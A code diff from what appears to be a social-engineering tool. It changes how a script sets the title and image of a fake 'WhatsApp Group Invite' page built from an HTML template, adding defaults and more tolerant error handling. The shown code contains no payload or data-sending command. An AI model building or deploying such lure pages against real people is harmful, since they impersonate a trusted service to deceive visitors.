@@ -12,26 +12,40 @@ W = '\033[0m'  # white
 title = os.getenv('TITLE')
 image = os.getenv('IMAGE')
 
-if title is None:
-    title = input(f'{G}[+] {C}Group Title : {W}')
-else:
-    utils.print(f'{G}[+] {C}Group Title :{W} '+title)
-
-if image is None:
-    image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
-else:
-    utils.print(f'{G}[+] {C}Group Image :{W} '+image)
-
-img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
-if img_name :
-    img_name = img_name.split('/')[-1]
-else:
-    img_name = image.split('/')[-1]
+if not title:
     try:
-        shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
+        title = input(f'{G}[+] {C}Group Title : {W}')
+    except Exception:
+        title = ''
+if not title:
+    title = 'WhatsApp Group Invite'
+utils.print(f'{G}[+] {C}Group Title :{W} ' + title)
+
+if not image:
+    try:
+        image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
+    except Exception:
+        image = ''
+if not image:
+    image = 'template/whatsapp/images/ZIvBTrQd9nP.png'
+utils.print(f'{G}[+] {C}Group Image :{W} ' + image)
+
+img_name = None
+if image.startswith('http'):
+    img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
+    if img_name:
+        img_name = img_name.split('/')[-1]
+
+if not img_name:
+    img_name = image.split('/')[-1]
+    dest = f'template/whatsapp/images/{img_name}'
+    try:
+        if os.path.exists(image) and os.path.abspath(image) != os.path.abspath(dest):
+            shutil.copyfile(image, dest)
     except Exception as e:
-        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
-        exit()
+        utils.print('\n' + R + '[-]' + C + ' Warning : ' + W + str(e))
+    if not os.path.exists(dest):
+        img_name = 'ZIvBTrQd9nP.png'
 
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
